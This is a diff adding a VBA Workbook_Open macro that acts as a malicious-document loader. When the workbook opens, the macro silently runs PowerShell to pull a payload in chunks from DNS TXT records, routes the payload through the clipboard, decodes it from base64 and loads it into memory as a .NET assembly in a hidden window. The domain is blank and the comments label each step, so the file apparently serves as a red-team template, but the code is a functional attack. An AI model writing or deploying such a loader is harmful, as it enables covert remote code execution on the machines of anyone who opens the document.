@@ -1,0 +1,30 @@
+Private Sub Workbook_Open()
+    Dim domain As String
+    Dim timeout As String
+    
+    'MsgBox "Step 1 : Downloading Payload"
+    domain = ""
+    arg = "For($i=0;$i -lt 35;$i++){$temp=(nslookup -retry=50 -timeout=1 -q=TXT $i'" & domain & "')[-1];$result=$result+$temp};$result"
+    PScmd = "powershell -command " & arg & "|clip"
+
+    CreateObject("WScript.Shell").Run PScmd, 0, True
+    
+    'MsgBox "Step 2 : Copy Payload to clipboard"
+    With CreateObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
+        .GetFromClipboard
+        output_clipboard = .GetText(1)
+    End With
+    
+    output_clipboard = Replace(output_clipboard, Chr$(9), vbNullString)
+    output_clipboard = Replace(output_clipboard, Chr(34), vbNullString)
+    output_clipboard = Replace(output_clipboard, vbNewLine, vbNullString)
+    output_clipboard = Replace(output_clipboard, vbCrLf, vbNullString)
+    output_clipboard = Replace(output_clipboard, " ", "")
+    
+    'MsgBox "Step 3 : Executing Payload"
+    'Debug.Print output_clipboard
+    
+    PScmd = "powershell.exe -NoExit -WindowStyle hidden -command $b64='" & output_clipboard & "';Write-Host $b64;$bytes=[System.Convert]::FromBase64String($b64);$assembly=[System.Reflection.Assembly]::Load($bytes);$assembly.EntryPoint.Invoke($null,$null);"
+    CreateObject("WScript.Shell").Run PScmd
+
+End Sub
